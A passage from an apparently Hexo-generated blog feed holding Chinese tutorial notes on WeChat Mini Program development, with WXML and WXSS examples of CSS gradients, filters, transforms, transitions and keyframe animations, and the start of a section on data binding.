class="string">&quot;imglist&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;circle&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/logo.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.imglist</span> <span class="selector-class">.circle</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-渐变与动画"><a href="#0x04-渐变与动画" class="headerlink" title="0x04 渐变与动画"></a>0x04 渐变与动画</h2><h3 id="0x001-渐变Gradient"><a href="#0x001-渐变Gradient" class="headerlink" title="0x001 渐变Gradient"></a>0x001 渐变Gradient</h3><p>新建gradient界面，在wxml文件中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;gradient-display&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并在wxss文件中输入：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.gradient-display</span>&#123;</span><br><span class="line">  <span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(red, blue);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此处背景图片使用了linear-gradient属性，默认渐变方向是从上到下，由红到蓝</p><h3 id="0x002-改变渐变的方向"><a href="#0x002-改变渐变的方向" class="headerlink" title="0x002 改变渐变的方向"></a>0x002 改变渐变的方向</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, blue, red);</span><br><span class="line"><span class="comment">/*将背景变为 *渐变轴为45度，从蓝色渐变到红色*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(to left top, blue, red);</span><br><span class="line"><span class="comment">/*从右下到左上、从蓝色渐变到红色*/</span></span><br></pre></td></tr></table></figure><h3 id="0x003-增加更多颜色变换"><a href="#0x003-增加更多颜色变换" class="headerlink" title="0x003 增加更多颜色变换"></a>0x003 增加更多颜色变换</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>:<span class="built_in">linear-gradient</span>(<span class="number">0deg</span>, blue, green <span class="number">40%</span>, red);<span class="comment">/*从下到上（渐变轴为0度），从蓝色开始渐变、到高度40%位置是绿色渐变开始、最后以红色结束*/</span></span><br></pre></td></tr></table></figure><h3 id="0x004-增加颜色的百分比"><a href="#0x004-增加颜色的百分比" class="headerlink" title="0x004 增加颜色的百分比"></a>0x004 增加颜色的百分比</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">19deg</span>, <span class="built_in">rgb</span>(<span class="number">33</span>, <span class="number">212</span>, <span class="number">253</span>) <span class="number">0%</span>, <span class="built_in">rgb</span>(<span class="number">183</span>, <span class="number">33</span>, <span class="number">255</span>) <span class="number">100%</span>);</span><br></pre></td></tr></table></figure><h3 id="0x005-Filter滤镜"><a href="#0x005-Filter滤镜" class="headerlink" title="0x005 Filter滤镜"></a>0x005 Filter滤镜</h3><p>filter属性可以对图片进行高斯模糊、调整对比度、转换为灰度图像、色相旋转、图片透明等操作</p><p>新建的filter页面</p><p>在wxml文件中嵌入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>blur高斯模糊<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;blur&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>grayscale图片变灰<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>opacity图片透明<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;opacity&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>多个滤镜叠加，注意css的写法即可<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在wxss文件中嵌入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.filter-display</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.blur</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.opacity</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.multiple</span>&#123;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">8px</span>) <span class="built_in">grayscale</span>(<span class="number">90%</span>) <span class="built_in">opacity</span>(<span class="number">25%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现图片的依次变化</p><p>关键词：blur grayscale opacity filter</p><h3 id="0x006-图片由灰色变为彩色"><a href="#0x006-图片由灰色变为彩色" class="headerlink" title="0x006 图片由灰色变为彩色"></a>0x006 图片由灰色变为彩色</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;filter-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>将鼠标悬停（模拟器）或手指（手机微信）按住或放开图片查看效果<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;grayscale&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;grayscale-hover&quot;</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wxss</span><br><span class="line"><span class="selector-class">.filter-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">90%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.grayscale-hover</span>&#123;</span><br><span class="line">  <span class="attribute">filter</span>:<span class="built_in">grayscale</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Mini Program Development[2]</title>
      <link href="/2020/03/20/Introduction-to-Mini-Program-Development-2/"/>
      <url>/2020/03/20/Introduction-to-Mini-Program-Development-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x007-高斯模糊的背景"><a href="#0x007-高斯模糊的背景" class="headerlink" title="0x007 高斯模糊的背景"></a>0x007 高斯模糊的背景</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;userinfo-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;blur-bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;user-img&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/luffy.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.blur-bg</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;<span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/blurimg.jpg</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">15px</span>);</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center; </span><br><span class="line">    <span class="attribute">align-items</span>:center;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span> image &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80</span>rpx;<span class="attribute">height</span>: <span class="number">80</span>rpx;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x008-变形属性Transform"><a href="#0x008-变形属性Transform" class="headerlink" title="0x008 变形属性Transform"></a>0x008 变形属性Transform</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;transform-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>缩放,scale(x,y)，x为长度缩放倍数，y为宽度缩放倍数，如果只有一个值，则是长和宽缩放的倍数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;scale&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>平移,translate(x,y)，x为x轴平移的距离，y为y轴平移的距离，如果只有一个值，则是x和y轴缩放的距离，值可以为负数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;translate&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>旋转,rotate()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;rotate&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>倾斜,skew()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;skew&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.transform-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80px</span>;<span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-class">.scale</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>,<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.translate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">500px</span>,<span class="number">20px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rotate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.skew</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">skew</span>(<span class="number">120deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x009-过渡属性Transition"><a href="#0x009-过渡属性Transition" class="headerlink" title="0x009 过渡属性Transition"></a>0x009 过渡属性Transition</h3><p><code>语法：transition: [transition-property] [transition-duration] [transition-timing-function] [transition-delay];&#125;</code></p><ul><li><strong>transition-property</strong>，应用过渡的 CSS 或动画属性的名称；</li><li><strong>transition-duration</strong>，整个过渡效果持续的时间，默认时间为0秒，所以要有过渡效果这个是必须定义的；</li><li><strong>transition-timing-function</strong>，规定过渡效果的时间曲线，默认为ease；</li><li><strong>transition-delay</strong>，过渡效果延迟多久，或者说何时开始，默认为0秒，不定义的话也就是直接开始；</li></ul><h3 id="0x010-背景颜色的变化"><a href="#0x010-背景颜色的变化" class="headerlink" title="0x010 背景颜色的变化"></a>0x010 背景颜色的变化</h3><p>  同样还是把下面的代码输入到小程序的页面当中，通过实战的方式来查看效果。</p><p>  使用开发者工具新建一个transition页面，然后在transition.wxml页面里面输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;transition-display&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;box bg-color&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;bg-color-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.box</span>&#123;<span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: <span class="number">150px</span>;<span class="attribute">cursor</span>: pointer;&#125;</span><br><span class="line">  <span class="selector-class">.bg-color</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>:green;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.bg-color-hover</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>: yellow;</span><br><span class="line">      <span class="attribute">transition</span>: background-color <span class="number">5s</span> ease-out <span class="number">3s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  动画是需要触发的，这里我们使用的是<strong>悬停hover-class</strong>来触发效果，把鼠标放在元素上8秒以上，看一下正方形的背景颜色有什么变化。</p><p>  了解了效果之后，我们再来结合实际案例理解语法：</p><ul><li><p>因为我们是用hover来触发的，所以transition要写在元素的hover-class里，盒子之前的背景是绿色green，悬停的背景是黄色yellow；</p></li><li><p>因为我们改变的是盒子background-color，所以transition需要过渡的CSS属性名称，就是background-color；</p></li><li><p>动画过渡持续的时间，我们设置的是5秒，也就是背景由绿色变为黄色的时间；</p></li><li><p>这里的ease-out（慢速结束）是颜色过渡的时间曲线效果。还可以有linear（匀速）、ease-in（慢速开始）、ease-in-out（慢速开始和慢速结束）。持续的时间很短的情况下，这几个时间曲线效果差别是及其细微的，<strong>需要设计师对动画足够敏感了</strong>。</p></li><li><p>动画延迟的时间是3秒，也就是说3秒之后动画才开始。</p><p>一个综合案例，在transition.wxml里输入</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>盒子的多个属性一起动画: width, height, background-color, transform. 将鼠标或手指悬停在盒子上查看动画之后放开。<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;animatebox&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;animatebox-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  在transition.wxss里输入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.animatebox</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: block;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#4a9d64</span>;</span><br><span class="line">      <span class="attribute">transition</span>:width <span class="number">2s</span>, height <span class="number">2s</span>, background-color <span class="number">2s</span>, transform <span class="number">2s</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.animatebox-hover</span> &#123;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#cd584a</span>;</span><br><span class="line">      <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">180deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x011-动画属性Animation"><a href="#0x011-动画属性Animation" class="headerlink" title="0x011 动画属性Animation"></a>0x011 动画属性Animation</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;fadeIn&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">view</span>&gt;</span>注意会有一个无限颜色渐变变化的动画<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> fadeIn &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-class">.fadeIn</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: <span class="number">4s</span> linear <span class="number">0s</span> infinite alternate fadeIn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-数据绑定"><a href="#0x05-数据绑定" class="headerlink" title="0x05 数据绑定"></a>0x05 数据绑定</h2><h3 id="0x001-数据分离"><a href="#0x001-数据分离" class="headerlink" title="0x001 数据分离"></a>0x001 数据分离</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;username&#125;&#125;，您已登录，欢迎<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在js的data里面插入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"> <span class="attr">username</span>:<span class="string">&quot;xx&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><h3 id="0x002-数据类型"><a href="#0x002-数据类型" class="headerlink" title="0x002 数据类型"></a>0x002 数据类型</h3><p>通过前面的案例我们了解到WXML 中的动态数据均来自对应 Page 的 data。 data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><ul><li><strong>字符串String</strong>，用于存储和处理文本，可以结合Excel单元格格式里的文本格式来理解；</li><li><strong>数字Number</strong>，这个很好理解，比如233这个数，它的数字格式和文本格式是有很大不同的，学Excel一定不会陌生；</li><li><strong>布尔值Boolean</strong>，就是true和false，虽然只有两个值，但是它代表着两种选择，两种不同的条件，两种不同的结果；</li><li><strong>对象Object</strong>，结合之前所学，我们再来回顾一下：对象由大括号{}分隔，在大括号{}内部，对象的属性以名称和值对的形式 name : 